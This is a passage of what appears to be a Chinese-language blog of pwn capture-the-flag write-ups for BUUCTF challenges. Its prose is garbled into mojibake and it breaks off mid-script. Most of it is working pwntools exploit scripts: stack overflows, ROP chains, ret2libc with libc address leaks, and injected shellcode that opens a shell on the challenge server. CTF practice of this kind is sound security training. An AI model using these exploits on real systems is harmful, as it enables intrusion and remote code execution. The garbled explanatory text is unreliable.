title="0x10.ciscn_2019_en_2"></a>0x10.ciscn_2019_en_2</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.3tuloknore2o.webp"></p><p>ä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™é“é¢˜å’Œç¬¬å…«é¢˜ä¸€æ¨¡ä¸€æ ·ï¼Œé‚£æˆ‘å°±æ…·æ…¨åœ°æ”¶ä¸‹flagå•¦ï¼</p><p>é¢˜è§£é“¾æ¥ï¼š<a href="http://c2yb8er.cn/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/">ç‚¹æ­¤å¤„è·³è½¬</a></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.6uco3gsajlvk.webp"></p><h2 id="0x11-not-the-same-3dsctf-2016"><a href="#0x11-not-the-same-3dsctf-2016" class="headerlink" title="0x11.not_the_same_3dsctf_2016"></a>0x11.not_the_same_3dsctf_2016</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.3r6llghqlq9s.webp"></p><h3 id="æ–¹æ³•ä¸€ï¼šmprotect-è¯¦æƒ…å‚è€ƒåäºŒé¢˜ï¼‰"><a href="#æ–¹æ³•ä¸€ï¼šmprotect-è¯¦æƒ…å‚è€ƒåäºŒé¢˜ï¼‰" class="headerlink" title="æ–¹æ³•ä¸€ï¼šmprotect(è¯¦æƒ…å‚è€ƒåäºŒé¢˜ï¼‰"></a>æ–¹æ³•ä¸€ï¼šmprotect(è¯¦æƒ…å‚è€ƒåäºŒé¢˜ï¼‰</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.1ik9w9v1ibgg.webp"></p><h3 id="æ–¹æ³•äºŒï¼šæ­£å¸¸è§£æ³•-å†™å…¥å’Œè¯»å–"><a href="#æ–¹æ³•äºŒï¼šæ­£å¸¸è§£æ³•-å†™å…¥å’Œè¯»å–" class="headerlink" title="æ–¹æ³•äºŒï¼šæ­£å¸¸è§£æ³•(å†™å…¥å’Œè¯»å–)"></a>æ–¹æ³•äºŒï¼šæ­£å¸¸è§£æ³•(å†™å…¥å’Œè¯»å–)</h3><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.15dz21cvk1a8.webp"></p><p>æ ˆæº¢å‡ºè·³è½¬åˆ°è¿™é‡Œå°†flagå†™å…¥åˆ°<code>fl4g</code>æ‰€åœ¨ä½ç½®ï¼Œå†åˆ©ç”¨æ‰“å°å‡½æ•°å°†å…¶æ‰“å°å‡ºæ¥ã€‚</p><p>putså‡½æ•°æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œä½†æ˜¯å¾ˆé—æ†¾æœ¬é¢˜æ²¡æœ‰ã€‚</p><p>ç„¶åæˆ‘æƒ³åˆ°äº†printfå‡½æ•°ï¼Œè™½ç„¶æœ¬é¢˜æœ‰ä½†æ˜¯æˆ‘è²Œä¼¼è°ƒç”¨ä¸æ¥å‘œå‘œå‘œï¼š<img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.gxsy29p1hww.webp"></p><p>ç„¶åæˆ‘æƒ³åˆ°äº†writeå‡½æ•°ï¼Œå°†å®ƒå†™åˆ°æ ‡å‡†è¾“å‡º<code>1</code>å°±å¯ä»¥è¾“å‡ºflagäº†ã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.7lh4xduo4oe8.webp"></p><h4 id="payloadå¦‚ä¸‹ï¼š"><a href="#payloadå¦‚ä¸‹ï¼š" class="headerlink" title="payloadå¦‚ä¸‹ï¼š"></a>payloadå¦‚ä¸‹ï¼š</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">c = process(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/17&quot;</span>)</span><br><span class="line"><span class="comment"># c = remote(&quot;node4.buuoj.cn&quot;,28085)</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">main_addr = <span class="number">0x080489E0</span></span><br><span class="line">get_secret = <span class="number">0x080489A0</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>  + p32(get_secret) + p32(main_addr) </span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span> + p32(write_addr) + p32(<span class="number">0xdeedbeef</span>) + p32(<span class="number">1</span>) + p32(flag_addr) + p32(<span class="number">100</span>) </span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜çš„ç»éªŒå°±æ˜¯ï¼š<mark>writeå‡½æ•°çš„ä½¿ç”¨</mark></p><p><mark>è¡¥å……:printfå‡½æ•°çš„æ‰“æ³•</mark></p><p>ç›´æ¥å…¥å‚ï¼šæœ¬åœ°å¯ä»¥æ‰“é€šï¼Œä½†æ˜¯è¿œç¨‹æ‰“ä¸é€šï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.1vn4o6ll3eio.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.3bcrw6azw0g.webp"></p><p>çœ‹è§è¿œç¨‹æŠ¥<code>timeout</code>é”™è¯¯ï¼Œæˆ‘å°±æƒ³åˆ°å»è°ƒç”¨exitå‡½æ•°ä¸»åŠ¨æ€æ­»è¿›ç¨‹ï¼Œæ²¡æƒ³åˆ°çœŸçš„æ‰“é€šäº†ï¼Œä¼°è®¡æ˜¯è°ƒç”¨çš„printfå‡½æ•°æœ€åä¸çŸ¥é“å’‹è¿”å›ç»“æŸï¼Œåé¢è°ƒç”¨äº†exitç»ˆæ­¢å°±æ­£å¸¸å›æ˜¾äº†ã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.1d2k4p7z5um8.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/17&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25437</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">main_addr = <span class="number">0x080489E0</span></span><br><span class="line">get_secret = <span class="number">0x080489A0</span></span><br><span class="line">write_addr = <span class="number">0x0806E270</span></span><br><span class="line">printf_addr = <span class="number">0x0804F0A0</span></span><br><span class="line">flag_addr = <span class="number">0x080ECA2D</span></span><br><span class="line">exit_addr = <span class="number">0x0804E660</span></span><br><span class="line">pop2 = <span class="number">0x080483ba</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span>  + p32(get_secret) + p32(main_addr) </span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x2d</span> + p32(printf_addr) + p32(pop2) +p32(flag_addr) + p32(exit_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x12-ciscn-2019-n-5"><a href="#0x12-ciscn-2019-n-5" class="headerlink" title="0x12.ciscn_2019_n_5"></a>0x12.ciscn_2019_n_5</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.2wlrsxj48gqo.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.4jw2t6u6yu80.webp"></p><p>æ€è·¯æŒºç®€å•ï¼šå†™å…¥shellcodeï¼Œæ ˆæº¢å‡ºæ‰§è¡Œã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/18&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29845</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">c.recvuntil(<span class="string">b&quot;tell me your name\n&quot;</span>)</span><br><span class="line">c.sendline(shellcode)</span><br><span class="line">shell_addr = <span class="number">0x0601080</span></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;What do you want to say to me?\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(shell_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>â€‹    è¿œç¨‹æ‰“å¾—é€šï¼Œæœ¬åœ°æ‰“ä¸é€šã€‚</p><p>â€‹    åŸå› æˆ‘æ‹¿idaæŸ¥çœ‹äº†ä¸€ä¸‹bssæ®µåœ¨æœ¬åœ°ä»å±äºä¸å¯æ‰§è¡Œã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.3i0xxctq4e0w.webp"></p><h2 id="0x13-others-shellcode"><a href="#0x13-others-shellcode" class="headerlink" title="0x13.others_shellcode"></a>0x13.others_shellcode</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.7c37i3ict3eo.webp"></p><p>æ³¨æ„æ­¤é¢˜å¼€å¯äº†<code>PIEä¿æŠ¤</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.hmpr883jluo.webp"></p><p>ä»£ç ç»“æ„å¾ˆç®€å•ï¼š<a class="link" href="https://blog.csdn.net/wcccg/article/details/78496940?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522167401138416800217079054%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=167401138416800217079054&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-78496940-null-null.142%5Ev71%5Ewechat,201%5Ev4%5Eadd_ask&utm_term=__asm&spm=1018.2226.3001.4187">__asmå…³é”®å­—<i class="fas fa-external-link-alt"></i></a></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.paexend20qo.webp"></p><p>ä¸éœ€è¦payloadçš„ä¸€é“é¢˜ï¼Œä½†æ˜¯è®©æˆ‘é•¿è§è¯†äº†__asm</p><h2 id="0x14ciscn-2019-ne-5"><a href="#0x14ciscn-2019-ne-5" class="headerlink" title="0x14ciscn_2019_ne_5"></a>0x14ciscn_2019_ne_5</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.68q7ny6rgjnk.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.6u2x652gin0g.webp"></p><p>â€‹    å¥½é¢˜ï¼åˆæ­¥çœ‹äº†ä¸€éè¿˜æ²¡å‘ç°è¿›æ”»ç‚¹ã€‚</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.z9m0baknrpc.webp"></p><p>â€‹    æ‰¾åˆ°æº¢å‡ºç‚¹äº†ï¼Œå…ˆaddï¼Œå†åˆ©ç”¨strcpyé€ æˆæº¢å‡ºã€‚</p><p>â€‹    æœ‰<code>system</code>æ— <code>bin/sh</code>ï¼Œè€Œä¸”payloadé•¿åº¦é™åˆ¶åœ¨128ï¼Œè€Œä¸”åç§»é‡ä¸º76ï¼Œæˆ‘ä»¬å‰©ä¸‹çš„ç©ºé—´åªæœ‰<code>52</code>å­—èŠ‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/20&quot;)</span></span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28642</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Please input admin password:&quot;</span>)</span><br><span class="line">c.sendline(<span class="string">b&quot;administrator&quot;</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please input new log info:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_plt= <span class="number">0x80484d0</span></span><br><span class="line">scanf_plt = <span class="number">0x8048500</span></span><br><span class="line">buf = <span class="number">0x0804A034</span></span><br><span class="line">scanf_argv = <span class="number">0x080489DB</span></span><br><span class="line">pop =<span class="number">0x0804871f</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4c</span> + p32(scanf_plt) + p32(pop) + p32(scanf_argv) + p32(buf) + p32(system_plt) + p32(<span class="number">0xdeedbeef</span>) + p32(buf)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">c.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.4xd40ufmyt1c.webp"></p><p>â€‹    æˆ‘è‡ªå·±åˆæ¬¡å†™çš„payloadï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆå‘è¿‡å»å°±è¢«æˆªæ–­äº†ã€‚</p><p>â€‹    ä¹Ÿä¸çŸ¥é“æˆ‘çš„scanfå‡½æ•°è°ƒç”¨æ­£ç¡®æ²¡æœ‰ï¼Œæ‰“ä¸é€šå®åœ¨æ²¡æ€è·¯äº†çœ‹çœ‹é¢˜è§£å§å‘œå‘œã€‚</p><p>â€‹    <img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.7d57rb16ietc.webp"></p><p><mark>åŸæ¥<code>/bin/sh</code>å’Œ<code>sh</code>çš„æ•ˆæœæ˜¯ä¸€æ ·çš„ã€‚</mark></p><p>é‚£å°±ä¸ç”¨è‡ªå·±å†™å…¥ï¼Œç›´æ¥åˆ©ç”¨å°±å¯ä»¥ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/20&quot;)</span></span><br><span class="line">c =remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28642</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">c.recvuntil(<span class="string">b&quot;Please input admin password:&quot;</span>)</span><br><span class="line">c.sendline(<span class="string">b&quot;administrator&quot;</span>)</span><br><span class="line"></span><br><span class="line">c.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Please input new log info:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_plt= <span class="number">0x80484d0</span></span><br><span class="line">sh_addr =<span class="number">0x080482ea</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4c</span> + p32(system_plt) + p32(<span class="number">0xdeedbeef</span>) + p32(sh_addr)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">c.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x15-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop"><a href="#0x15-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop" class="headerlink" title="0x15.é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop"></a>0x15.é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.118enfp322uo.webp"></p><p>ç®€å•çš„æº¢å‡ºï¼Œpayloadé•¿åº¦é™åˆ¶åœ¨256å­—èŠ‚ï¼Œæ— sysï¼Œæ— /bin/shï¼Œè€ƒè™‘ret2libc3</p><p>æˆ‘çš„payloadæ²¡æ‰“é€šï¼Œæˆ‘çš„æ€è·¯æ˜¯åˆ©ç”¨writeå‡½æ•°æ³„éœ²ç„¶åä¸€æŠŠæ¢­ï¼Œä½†æ˜¯æ‰‹åŠ¨è¯•äº†ä¸‹éƒ½ä¸é€šã€‚æ¢å¦ä¸€ä¸ªå‡½æ•°æ³„éœ²è¯•è¯•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/21&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27718</span>)</span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/21&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = celf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_start_main_got = celf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">main = celf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*(0x88+0x4) + p32(write_plt) + p32(main) + p32(1) + p32(libc_start_main_got) + p32(50)</span></span><br><span class="line"><span class="comment"># c.sendline(payload)</span></span><br><span class="line"><span class="comment"># str =b&quot;\x90-\xd1\xf7\xf0\xf6\xdd\xf7\x80\x8f\xdb\xf7&quot;</span></span><br><span class="line"><span class="comment"># str = str[0:4].ljust(4,b&#x27;\0&#x27;)</span></span><br><span class="line"><span class="comment"># str = u32(str)</span></span><br><span class="line"><span class="comment"># print(hex(str))</span></span><br><span class="line"><span class="comment"># print(u32(&quot;\xe0\xad\xcf\xf7&quot;))</span></span><br><span class="line"><span class="comment"># 0xf7d12d90</span></span><br><span class="line">libc_start_main_addr = <span class="number">0xf7d12d90</span></span><br><span class="line">libc_base = libc_start_main_addr - <span class="number">0x018d90</span></span><br><span class="line">system_addr = libc_base + <span class="number">0x03d200</span></span><br><span class="line">bin_sh = libc_base +  <span class="number">0x17e0cf</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)</span><br><span class="line">c.sendline(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>ç”¨ä¸€ä¸‹è„šæœ¬ï¼Œæ‰‹æ¢­å¥½ç´¯ï¼š</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.1mp5hlz83jz4.webp"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/21&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">27718</span>)</span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/21&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">write_plt = celf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = celf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main = celf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">c.sendline(payload)</span><br><span class="line">write_addr=u32(c.recv())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HERE!&quot;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,write_addr)</span><br><span class="line">libcbase = write_addr - libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr = libcbase + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">0x4</span>) + p32(system_addr) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(bin_sh)</span><br><span class="line">c.sendline(payload1)</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>å¯èƒ½æ˜¯å› ä¸ºåº“çš„åŸå› å§ï¼Œæˆ‘ç”¨<code>__libc_start_main</code>å°±æ²¡æœ‰æ‰“é€šï¼Œç”¨<code>write</code>æ‰“é€šäº†ï¼å…¶å®è¿˜å¥½ï¼Œæ€è·¯æ˜¯æ­£ç¡®çš„ã€‚</p><h2 id="0x16-bjdctf-2020-babyrop"><a href="#0x16-bjdctf-2020-babyrop" class="headerlink" title="0x16.bjdctf_2020_babyrop"></a>0x16.bjdctf_2020_babyrop</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.3onmaf3t6b0g.webp"></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/images@master/20230118/%E5%9B%BE%E7%89%87.7e8i3fqh5ugw.webp"></p><p>åŸºæœ¬çš„<code>ret2libc3</code>ï¼Œä½†æ˜¯æ³¨æ„ä¼ å‚è§„åˆ™AMD64</p><p>â€‹    è¯¦æƒ…å‚è€ƒ<a href="http://c2yb8er.cn/2023/01/17/BUU-PWN%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0%E2%91%A0/#%E5%85%AB%E3%80%81ciscn-2019-c-1">ç¬¬å…«é¢˜</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># c = process(&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/22&quot;)</span></span><br><span class="line">c = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29606</span>)</span><br><span class="line">celf = ELF(<span class="string">&quot;/mnt/hgfs/è™šæ‹Ÿæœºå…±äº«æ–‡ä»¶å¤¹/BUU/22&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">puts_plt = celf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = celf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_addr = celf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0400733</span></span><br><span class="line">ret = <span class="number">0x04004c9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">c.recvuntil(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">payload = 